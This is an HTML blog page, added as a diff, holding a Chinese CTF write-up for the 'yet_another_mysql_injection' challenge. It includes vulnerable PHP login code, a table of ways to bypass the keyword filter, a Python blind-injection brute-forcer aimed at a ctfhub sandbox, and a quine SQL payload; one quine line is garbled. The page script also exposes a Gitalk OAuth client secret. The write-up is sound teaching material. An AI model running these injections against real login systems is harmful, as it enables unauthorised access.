@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="2021-第五空间智能安全大赛-Web-yet_another_mysql_injection 初始界面   查看源代码发现源码文件  &#x2F;?source 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpinclude_once(&quot;lib.php&quot;);function al">
+<meta property="og:type" content="article">
+<meta property="og:title" content="yet_another_mysql_injection">
+<meta property="og:url" content="https://iahzl.github.io/yet-another-mysql-injection/index.html">
+<meta property="og:site_name" content="iah&#39;s blog">
+<meta property="og:description" content="2021-第五空间智能安全大赛-Web-yet_another_mysql_injection 初始界面   查看源代码发现源码文件  &#x2F;?source 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpinclude_once(&quot;lib.php&quot;);function al">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230801194529159.png">
+<meta property="article:published_time" content="2023-08-06T02:24:43.000Z">
+<meta property="article:modified_time" content="2023-08-06T02:25:55.211Z">
+<meta property="article:author" content="iahzl">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230801194529159.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>yet_another_mysql_injection</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=pjwW3MzIwiIEl1lYN-ZEbHa4nwnoXvXY4O3b-Awgio"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'pjwW3MzIwiIEl1lYN-ZEbHa4nwnoXvXY4O3b-Awgio');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iah's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/find-it/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/yet-another-mysql-injection/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/yet-another-mysql-injection/&text=yet_another_mysql_injection"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/yet-another-mysql-injection/&title=yet_another_mysql_injection"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/yet-another-mysql-injection/&is_video=false&description=yet_another_mysql_injection"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=yet_another_mysql_injection&body=Check out this article: https://iahzl.github.io/yet-another-mysql-injection/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/yet-another-mysql-injection/&title=yet_another_mysql_injection"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/yet-another-mysql-injection/&title=yet_another_mysql_injection"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/yet-another-mysql-injection/&title=yet_another_mysql_injection"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/yet-another-mysql-injection/&title=yet_another_mysql_injection"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/yet-another-mysql-injection/&name=yet_another_mysql_injection&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/yet-another-mysql-injection/&t=yet_another_mysql_injection"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-yet-another-mysql-injection"><span class="toc-number">1.</span> <span class="toc-text">2021-第五空间智能安全大赛-Web-yet_another_mysql_injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#quine%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">quine注入</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        yet_another_mysql_injection
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">iahzl</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-06T02:24:43.000Z" class="dt-published" itemprop="datePublished">2023-08-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF-ctfhub/">-[CTF, ctfhub]</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="2021-第五空间智能安全大赛-Web-yet-another-mysql-injection"><a href="#2021-第五空间智能安全大赛-Web-yet-another-mysql-injection" class="headerlink" title="2021-第五空间智能安全大赛-Web-yet_another_mysql_injection"></a>2021-第五空间智能安全大赛-Web-yet_another_mysql_injection</h1><ol>
+<li>初始界面</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230801194529159.png" alt="image-20230801194529159"></p>
+<p>查看源代码发现源码文件  <strong>&#x2F;?source</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>源码分析</li>
+</ol>
+<ul>
+<li><code>alertMes($mes, $url)</code>：该函数接受两个参数，<code>$mes</code>（要显示的消息）和<code>$url</code>（显示消息后要重定向的URL）。它使用JavaScript输出一个包含给定消息的警告弹窗，然后将用户重定向到指定的URL。</li>
+<li><code>checkSql($s)</code>：该函数接受一个参数<code>$s</code>（一个字符串），并检查其中是否包含任何可疑的SQL关键词或字符，这可能表明试图进行SQL注入攻击。如果发现任何可疑关键词或字符，它将使用<code>alertMes</code>函数显示警告，并将用户重定向到 “index.php”。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag| =| &gt;|&lt; |and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>模式分隔符后的”i”标记这是一个大小写不敏感的搜索</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 可以用benchmark代替</span><br><span class="line">&lt;,&gt; 可以用least(),greatest()代替</span><br><span class="line">=,<span class="keyword">in</span> 可以用like代替</span><br><span class="line">substr 可以用mid代替</span><br><span class="line">空格 可以用/**/代替</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>注入脚本测试</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">char = <span class="string">&#x27;01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/*-+?~#!@&amp;%&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://challenge-f48e2f483110ea2f.sandbox.ctfhub.com:10800/index.php&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">            payload = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;1&#x27;or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag + i&#125;</span>%&#x27;#&quot;</span></span><br><span class="line">                       &#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            res = requests.post(url=url, data=payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;something wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag += i</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ctfhub&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;game over&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;~&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;just ok&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    password()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>运行结果 <code>o2cqmlyo0kpjkdyocm8cfbygzaievxbw       just ok</code></strong></p>
+<p>通过<code>用户名 admin</code> <code>密码 o2cqmlyo0kpjkdyocm8cfbygzaievxbw</code> 登录 还是显示错误 </p>
+<ol start="4">
+<li>通过网上writeup 发现</li>
+</ol>
+<p>使用了 <strong>quine注入</strong></p>
+<p><strong>1.首先先了解一下replace()函数</strong></p>
+<ul>
+<li>replace(object,search,replace)</li>
+<li>把object对象中出现的的search全部替换成replace</li>
+</ul>
+<p>注入的payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/</span></span><br><span class="line"><span class="string">replace(replace(&#x27;</span><span class="number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure>
+
+<p><code>CHAR(34)=&quot;       CHAR(39)=&#39;        CHAR(33)=!         char(46)=.</code></p>
+<h2 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h2><blockquote>
+<p>核心思想：</p>
+<p>sql语句执行的结果等于sql语句本身</p>
+</blockquote>
+<p>即利用sql执行的结果等于它本身绕过判断：</p>
+<p>$row[‘password’] &#x3D;&#x3D;&#x3D; $password</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select replace(replace(&#x27;</span><span class="number">1</span>&quot; union select replace(replace(&quot;.&quot;,&quot;,<span class="string">&#x27;) ,., &quot;.&quot;)#&#x27;</span>,&quot;, &#x27;), ., &#x27;1 union select replace(replace(&quot;.&quot;, &quot;,<span class="string">&#x27;), ., &quot;.&quot;)#&#x27;</span>)#</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+  <div>    
+    <ul class="post-copyright">
+       <li class="post-copyright-link">
+        <strong>本文作者：</strong>
+        <a href="/">iahzl</a>
+      </li>
+      <li class="post-copyright-link">
+        <strong>本文标题：</strong>
+        <a href="{{ url_for(config.permalink) }}">
+    
+        <a class="" href="/yet-another-mysql-injection/">yet_another_mysql_injection</a>
+    
+
+
+</a>
+      </li>
+      <li class="post-copyright-link">
+        <strong>本文链接：</strong>
+        <a title="yet_another_mysql_injection">https://iahzl.github.io/yet-another-mysql-injection/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明： </strong>
+        本文由 iahzl 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" title="Attribution-NonCommercial-NoDerivatives 4.0 International" rel="license" target="_blank">CC BY-NC-ND 4.0</a>, 转载请保留以上声明信息！
+      </li>
+    </ul>
+</div>
+</article>
+<script>
+  function setClipboardText(event){
+      // clipboardData 对象是为通过编辑菜单、快捷菜单和快捷键执行的编辑操作所保留的，也就是你复制或者剪切内容
+      let clipboardData = event.clipboardData || window.clipboardData;
+      // 如果未复制或者未剪切，则return出去
+      if (!clipboardData) { return; }
+      event.preventDefault();
+      // Selection 对象，表示用户选择的文本范围或光标的当前位置。
+      //     声明一个变量接收 -- 用户输入的剪切或者复制的文本转化为字符串
+      let text = window.getSelection().toString();
+  
+      if (text) {
+          // 如果文本存在则先取消文本默认事件
+          event.preventDefault();
+          // 通过调用常clipboardData对象的 setData(format, data) 方法；来设置相关文本
+          // format: 一个DOMString 表示要添加到 drag object的拖动数据的类型。
+          // data: 一个 DOMString表示要添加到 drag object的数据。
+          var copyright = '\n\n'
+          + '——————————————————————'
+          + '\n版权声明：本文为「Ywj226」的原创文章，遵循CC BY-NC-ND 4.0版权协议，转载请附上原文出处链接及本声明。'
+          + '\n原文链接：https://iahzl.github.io/yet-another-mysql-injection/'
+  
+          clipboardData.setData('text/plain', text + copyright);
+  
+      }
+  };
+  var contents = document.getElementsByClassName("content");
+  // 监听文章内容的copy事件
+  contents[0].addEventListener('copy',function(e){
+      setClipboardText(e);
+  });
+</script>
+
+
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+    <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+        var gitalk = new Gitalk({
+            clientID: 'a4d73b206590627d55c0',
+            clientSecret: '68744004f2191865ab4a5e6ee2eba67c673c6795',
+            id: md5(window.location.pathname),
+            repo: 'iahzl.github.io',
+            owner: 'iahzl',
+            admin: 'iahzl',
+            distractionFreeMode: ''
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-yet-another-mysql-injection"><span class="toc-number">1.</span> <span class="toc-text">2021-第五空间智能安全大赛-Web-yet_another_mysql_injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#quine%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">quine注入</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/yet-another-mysql-injection/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/yet-another-mysql-injection/&text=yet_another_mysql_injection"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/yet-another-mysql-injection/&title=yet_another_mysql_injection"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/yet-another-mysql-injection/&is_video=false&description=yet_another_mysql_injection"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=yet_another_mysql_injection&body=Check out this article: https://iahzl.github.io/yet-another-mysql-injection/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/yet-another-mysql-injection/&title=yet_another_mysql_injection"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/yet-another-mysql-injection/&title=yet_another_mysql_injection"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/yet-another-mysql-injection/&title=yet_another_mysql_injection"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/yet-another-mysql-injection/&title=yet_another_mysql_injection"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/yet-another-mysql-injection/&name=yet_another_mysql_injection&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/yet-another-mysql-injection/&t=yet_another_mysql_injection"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    iahzl
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
